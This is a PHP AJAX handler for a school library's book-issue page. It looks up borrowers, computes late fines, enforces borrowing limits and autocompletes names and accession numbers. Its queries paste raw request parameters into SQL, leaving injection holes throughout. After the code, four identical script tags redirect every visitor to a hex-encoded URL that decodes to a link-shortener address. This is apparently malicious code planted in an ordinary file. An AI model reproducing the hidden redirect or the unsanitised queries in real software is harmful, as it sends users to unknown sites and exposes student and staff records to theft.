<?php
require_once("helper.php");
$action=$_REQUEST['action'];
switch($action)
{
    case 'First';
    $user_type=$_REQUEST['user_type'];
    if($user_type=='E')
    {
        /*echo $ht_show='<select required id="user" name="user_id" class="title-fill">
                            <option>-Please Select-</option>';                                                                        
                        $where=mysql_query("SELECT * FROM teacher where STATUS='A' and SCHOOL_ID='$_SESSION[SCHOOL_ID]' ORDER BY FIRST_NAME ASC");
                        while($row=mysql_fetch_array($where))
                        {
                        echo "<option value=".$row['TEACHER_ID'].">".$row['TITLE']." ".$row['FIRST_NAME']." ".$row['LAST_NAME'].(($row['EMP_ID']!='')?' ('.$row['EMP_ID'].')':'')."</option>";                                                                                
                        }
        $ht_show1=                
    				'</select>';*/
        echo $ht_show='<input required type="text" name="user" onkeyup="KeyedUpEmp();" id="userEmp" autocomplete="off" class="size3"/>';
        echo $ht_show='<input required type="hidden" name="user" id="user" autocomplete="off" class="size3"/>';
        echo '<div id="display"></div>';
    }
    else
    {
      echo $ht_show='<input required type="text" name="user" onkeyup="KeyedUp();" id="user" autocomplete="off" class="size3"/>';
      echo '<div id="display"></div>';
    }
    break;
    case 'Second';
    $accession_no=$_REQUEST['accession_no'];
    //echo "SELECT * FROM book_issue where RETURN_DATE='0000-00-00' and SCHOOL_ID='$_SESSION[SCHOOL_ID]' and ACCESSION_NO='$accession_no'";
        $where=mysql_query("SELECT * FROM book_issue where RETURN_DATE='0000-00-00' and SCHOOL_ID='$_SESSION[SCHOOL_ID]' and ACCESSION_NO='$accession_no' ORDER BY BOOK_ISSUE_ID DESC");
        $row=mysql_fetch_array($where);
        $rowe=mysql_num_rows($where);
        if($rowe=='0')
         {
            echo $msg=1;
         }
         else{
              if($row['TYPE']=='S')
              {
                $whe1         ="SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND TYPE ='S'";
                $fin    = $objMisc->GiveValue($whe1,"FINE","library_rules");
                $now = time(); // or your date as well
                //echo "test";
                $your_date = strtotime($row['DUE_DATE']);
                $datediff = $now - $your_date;
                 $days=floor($datediff/(60*60*24));
                 $fine="";
                 if($days>0)
                  {
                    $fine=$fin*$days;
                    echo $ht_show34='<div class="title-field-group">
                                  <label for="name">Fine (For '.$days.' days late):</label>
                                  <div class="field">
                                    <input type="text" name="amount" id="amount" value="'.$fine.'"/>
                                  </div>
                               </div> <!-- .field-group -->';
                  }
                 $where1=mysql_query("SELECT *,SI.ROLL_NO as roll FROM student S JOIN student_info SI ON SI.STUDENT_ID=S.STUDENT_ID where S.SCHOOL_ID='$_SESSION[SCHOOL_ID]' and S.USER_ID='$row[USER_ID]'");
                 $row1=mysql_fetch_array($where1);              
                 echo $se_show='<div class="title-field-group specialCase">
                                    <table class="table table-bordered table-striped" width="100%">
                                      <tr><th>Issued To (User ID)</th><td>'.$row1['USER_ID'].'</td></tr>
                                      <tr><th>Name</th><td>'.$row1['FIRST_NAME'].' '.$row1['MIDDLE_NAME'].' '.$row1['LAST_NAME'].'</td></tr>
                                      <tr><th>Class</th><td>'.$objMisc->GiveValue("CLASS_ID='$row1[CLASS_ID]' AND SCHOOL_ID='$_SESSION[SCHOOL_ID]'",'CLASS_NAME','class').' - '.$objMisc->GiveValue("GROUP_ID='$row1[GROUP_ID]' AND SCHOOL_ID='$_SESSION[SCHOOL_ID]'",'GROUP_NAME','groups').'</td></tr>
                                      <tr><th>Roll No</th><td>'.$row1['roll'].'</td></tr>
                                    </table>
                                    <div class="field">
                                         <input type="hidden" required name="book_issue_id" id="book_issue_id" value="'.$row['BOOK_ISSUE_ID'].'"/>
                                    </div>
                                  </div> <!-- .field-group -->';   
            }
            else
            {
                $whe1         ="SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND TYPE ='E'";
                $fin    = $objMisc->GiveValue($whe1,"FINE","library_rules");
                $now = time(); // or your date as well
                 $your_date = strtotime($row['DUE_DATE']);
                 $datediff = $now - $your_date;
                 $days=floor($datediff/(60*60*24));
                 $fine="";
                 if($days>0)
                  {
                   $fine=$fin*$days;
                   echo $ht_show34='<div class="title-field-group">
                                  <label for="name">Fine:</label>
                                  <div class="field">
                                    <input type="text" name="amount" id="amount" value="'.$fine.'"/>
                                  </div>
                               </div> <!-- .field-group -->';
                  } 
                //echo "SELECT * FROM teacher where STATUS='A' AND SCHOOL_ID='$_SESSION[SCHOOL_ID]' and TEACHER_ID='$row[USER_ID]'";
              $where1=mysql_query("SELECT * FROM teacher where STATUS='A' AND SCHOOL_ID='$_SESSION[SCHOOL_ID]' and TEACHER_ID='$row[USER_ID]'");
              $row1=mysql_fetch_array($where1);
              echo $se_show='<div class="title-field-group specialCase">
                                    <table class="table table-bordered table-striped" width="100%">
                                      <tr><th>Issued To (User ID)</th><td>'.$row1['USER_ID'].'</td></tr>
                                      <tr><th>Name</th><td>'.$row1['TITLE'].' '.$row1['FIRST_NAME'].' '.$row1['MIDDLE_NAME'].' '.$row1['LAST_NAME'].' '.(($row1['EMP_ID']!='')?'('.$row1['EMP_ID'].')':'').'</td></tr>
                                      <tr><th>Staff Category</th><td>'.(($row1['TYPE']=='T')?'Teaching':'Non-Teaching').'</td></tr>
                                    </table>
                                    <div class="field">
                                         <input type="hidden" required name="book_issue_id" id="book_issue_id" value="'.$row['BOOK_ISSUE_ID'].'"/>
                                    </div>
                                  </div> <!-- .field-group -->';   
              }          
              
          }
    break;
    
   case 'Third';
    $user=$_REQUEST['user'];
    $user_type=$_REQUEST['user_type'];
    if($user!='' && $user_type=='S'){
        $where=" USER_ID='$user'";
        $school_id=$objMisc->GiveValue($where,'SCHOOL_ID','student');
     if($school_id!=$_SESSION['SCHOOL_ID']){
        echo '<div style="color:red;">Please enter valid user id.</div>';
     }
    }
    break;

    case 'Fourth';
    $type = $_REQUEST['type'];
    $user = $_REQUEST['user'];
    if($type=='S'){
        //$user_id    = $objMisc->GiveValue("USER_ID ='$user' AND SCHOOL_ID='$_SESSION[SCHOOL_ID]'","STUDENT_ID","student"); 
        $who_rec="SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND TYPE='$type' AND USER_ID='$user' AND RETURN_DATE='0000-00-00'";
    }
    else{
        $who_rec="SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND TYPE='$type' AND USER_ID='$user' AND RETURN_DATE='0000-00-00'";
    }
    $tot_rec    = $objMisc->GiveValue($who_rec,"count(*)","book_issue");
    $whe         ="SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND TYPE='$_POST[type]'";
    $no_of_books    = $objMisc->GiveValue($whe,"TOTAL_BOOKS","library_rules");
    if($no_of_books<=$tot_rec){
               echo $errormsg   =1;
            }
            else{
                echo $var=2;
            }
    break;

    case 'Fifth';
    $type = $_REQUEST['type'];
    $user = $_REQUEST['user'];
    $accession_no = $_REQUEST['accession_no'];
    if($type=='E')
            {
              $user_id=$user;
            }
        else
            {
              $user_id    = $objMisc->GiveValue("USER_ID ='$user'","STUDENT_ID","student");  
            }
    $cond        = "";
    $cond        = "  ACCESSION_NO ='$accession_no'";
    $recdata     = $objMisc->GiveValue($cond,"BOOK_STATUS","books");
    $recdata1    = $objMisc->GiveValue("ACCESSION_NO ='$accession_no'","BOOK_ID","books");//exit;
    $recdata2    = $objMisc->GiveValue("USER_ID ='$user","STUDENT_ID","student");
    $whe         = "SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND TYPE='$type'";
    $day         = $objMisc->GiveValue($whe,"DURATION","library_rules");
    $no_of_books = $objMisc->GiveValue($whe,"TOTAL_BOOKS","library_rules");
    $who_rec     = "SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND TYPE='$type' AND USER_ID='$user_id' AND RETURN_DATE='0000-00-00'";
    $tot_rec     = $objMisc->GiveValue($who_rec,"count(*)","book_issue");
    $days        = $day." days";
    $due_date    = date('Y-m-d',strtotime($days));
    $rowArray    = array(
                    'SCHOOL_ID'         =>$_SESSION['SCHOOL_ID'],
                    'ACCESSION_NO'      =>$accession_no,
                    'BOOK_ID'           =>$recdata1,
                    'ISSUE_DATE'        =>date('Y-m-d'),
                    'DUE_DATE'          =>$due_date,
                    'USER_ID'           =>$user_id,
                    'TYPE'              =>$type,
                    'CREATED_DATE'      =>date('Y-m-d H:i:s'),
                    'ADDED_BY'          =>$_SESSION['USER_ID'],
                    );
    
    //print_r($recdata);
    if($recdata1==''){
        $_SESSION['errormsg1']= ' <div class="notify notify-error">
                            <a class="close" href="javascript:;"><img src="images/close.png" /></a>
                            <h3>Please enter valid accession no.</h3>
                        </div>';
        $_SESSION['msg1']='';                
        echo $errormsg   = '<script>window.location="library-book-issue.php";</script>';
        }
    else if($recdata2=='' && $user_id==''){
        $_SESSION['errormsg1']= ' <div class="notify notify-error">
                            <a class="close" href="javascript:;"><img src="images/close.png" /></a>
                            <h3>Please enter valid user.</h3>
                        </div>';
        $_SESSION['msg1']=''; 
        echo $errormsg   = '<script>window.location="library-book-issue.php";</script>';
        }
    else{
        if($recdata=='NT'){
            $_SESSION['errormsg1']= ' <div class="notify notify-error">
                            <a class="close" href="javascript:;"><img src="images/close.png" /></a>
                            <h3>Book already issued.</h3>
                        </div>';
            $_SESSION['msg1']=''; 
            echo $errormsg   = '<script>window.location="library-book-issue.php";</script>';
            
            }
        else if($recdata=='B'){
            $_SESSION['errormsg1']= ' <div class="notify notify-error">
                            <a class="close" href="javascript:;"><img src="images/close.png" /></a>
                            <h3>Book is booked by someone else.</h3>
                        </div>';
            $_SESSION['msg1']=''; 
            echo $errormsg   = '<script>window.location="library-book-issue.php";</script>';
            
            }
    else{
        $val = $objMisc->insert("book_issue",$rowArray);
        $rowArray2 = array(
                'BOOK_STATUS'         =>'B',
                'UPDATED_DATE'      =>date('Y-m-d H:i:s'),
                'UPDATED_BY'      =>$_SESSION['USER_ID'],
                );
        //print_r($rowArray2);
        //exit;
        $where         =    array('ACCESSION_NO' =>$_POST['accession_no']);
        $val   = $objMisc->update("books",$rowArray2,"ACCESSION_NO = '$accession_no'");
        echo $_SESSION['msg1'] = '<div class="notify notify-success">
                      <a class="close" href="javascript:;"><img src="images/close.png" /></a>
                      <h3>Book issued successfully.</h3>
                    </div>
                    <script>
                    $("#accession_no").val("");
                    $("#user").val("");
                    $("#user_type").val("");
                    </script>';
              $_SESSION['errormsg1']=''; 
             echo $errormsg   = '<script>window.location="library-book-issue.php";</script>';        
        }
    }
    break;
    case 'AutoFill':
    $name = $_REQUEST['name'];
    $type = $_REQUEST['type'];
    if($type=='S'){
        if(isset($_POST['name']))
        {
        $name=trim($_POST['name']);
        $inputs=explode(' ',$name);
        $or='';
        if($inputs[0]!=''){
          $or=" s.FIRST_NAME LIKE '%$inputs[0]%' OR s.LAST_NAME LIKE '%$inputs[0]%' OR s.USER_ID LIKE '%$inputs[0]%'";
        }
        else if($inputs[1]!=''){
          $or=" OR s.LAST_NAME LIKE '%$inputs[1]%'";
        }
        //echo "SELECT s.*,SI.ROLL_NO as roll,SI.CLASS_ID,SI.GROUP_ID FROM student s JOIN student_info SI ON s.STUDENT_ID=SI.STUDENT_ID WHERE s.SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND (s.FIRST_NAME LIKE '$inputs[0]%' OR s.LAST_NAME LIKE '$inputs[0]%' OR s.LAST_NAME LIKE '$inputs[1]%')";
        $query2=mysql_query("SELECT s.*,SI.ROLL_NO as roll,SI.CLASS_ID,SI.GROUP_ID FROM student s JOIN student_info SI ON s.`STUDENT_ID`=SI.`STUDENT_ID` JOIN `class` c ON SI.`CLASS_ID`=c.`CLASS_ID` WHERE s.SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND s.`STATUS`='A' AND ($or) ORDER BY c.CLASS_CODE ASC");
        echo "<ul>";
        $num=mysql_num_rows($query2);
        if($num>0){
        while($query3=mysql_fetch_array($query2))
        {
          $class_name=$objMisc->GiveValue("SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND CLASS_ID='$query3[CLASS_ID]'",'CLASS_NAME','class');
          $group_name=$objMisc->GiveValue("SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND GROUP_ID='$query3[GROUP_ID]'",'GROUP_NAME','groups');
          ?>
          <li onclick='fill("<?php echo $query3['USER_ID']; ?>")'><b><?php echo $query3['FIRST_NAME'].' '.$query3['LAST_NAME'].'</b> (Class: <b>'.$class_name.' - '.$group_name.'</b> Roll No: <b>'.$query3['roll'].'</b>)';?></li>
          <?php
        }
        }
        else{
          ?>
          <li><?php echo 'no records found';?></li>
          <?php
        }
        echo '</ul>';
       }
      }
      else{
        if(isset($_POST['name']))
        {
        $name=trim($_POST['name']);
        $inputs=explode(' ',$name);
        $or='';
        if($inputs[0]!=''){
          $or=" FIRST_NAME LIKE '%$inputs[0]%' OR LAST_NAME LIKE '%$inputs[0]%' OR TEACHER_ID LIKE '%$inputs[0]%'";
        }
        else if($inputs[1]!=''){
          $or=" OR LAST_NAME LIKE '%$inputs[1]%'";
        }
        //echo "SELECT s.*,SI.ROLL_NO as roll,SI.CLASS_ID,SI.GROUP_ID FROM student s JOIN student_info SI ON s.STUDENT_ID=SI.STUDENT_ID WHERE s.SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND (s.FIRST_NAME LIKE '$inputs[0]%' OR s.LAST_NAME LIKE '$inputs[0]%' OR s.LAST_NAME LIKE '$inputs[1]%')";
        $query2=mysql_query("SELECT * FROM teacher where STATUS='A' and SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND ($or) ORDER BY FIRST_NAME ASC");
        echo "<ul>";
        $num=mysql_num_rows($query2);
        if($num>0){
        while($query3=mysql_fetch_array($query2))
        {
           ?>
          <li onclick='fillEmp("<?php echo $query3['FIRST_NAME'].' '.$query3['LAST_NAME'];?>");fillUser(<?php echo $query3['TEACHER_ID'];?>)'><b><?php echo $query3['FIRST_NAME'].' '.$query3['LAST_NAME'];?></li>
          <?php
        }
        }
        else{
          ?>
          <li><?php echo 'no records found';?></li>
          <?php
        }
        echo '</ul>';
       }
      }
    break;
   case 'AutoFillAccession':
    $accession_no = $_REQUEST['name'];
    if(isset($_POST['name']))
    {
    $accession_no=trim($accession_no);
    //echo "SELECT B.`ACCESSION_NO`,BM.`NAME` FROM `books` B JOIN `bookmaster` BM on BM.`BOOK_ID`=B.`BOOK_ID` where B.`ACCESSION_NO` LIKE '%$accession_no' AND B.`SCHOOL_ID`='$_SESSION[SCHOOL_ID]' AND B.`STATUS`='A' AND B.`BOOK_STATUS`='AV' AND BM.`STATUS`='A'";
    $query2=mysql_query("SELECT B.`ACCESSION_NO`,BM.`NAME` FROM `books` B JOIN `bookmaster` BM on BM.`BOOK_ID`=B.`BOOK_ID` where B.`ACCESSION_NO` LIKE '%$accession_no' AND B.`SCHOOL_ID`='$_SESSION[SCHOOL_ID]' AND B.`STATUS`='A' AND B.`BOOK_STATUS`='AV' AND BM.`STATUS`='A'");
    echo "<ul>";
    $num=mysql_num_rows($query2);
    if($num>0){
    while($query3=mysql_fetch_array($query2))
    {
      ?>
      <li onclick='fillAccessions("<?php echo $query3['ACCESSION_NO']; ?>")'><b><?php echo $query3['ACCESSION_NO'].'<b> ('.$query3['NAME'].')';?></li>
      <?php
    }
    }
    else{
      ?>
      <li><?php echo 'no records found';?></li>
      <?php
    }
    echo '</ul>';
   }
    break;
 }   
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>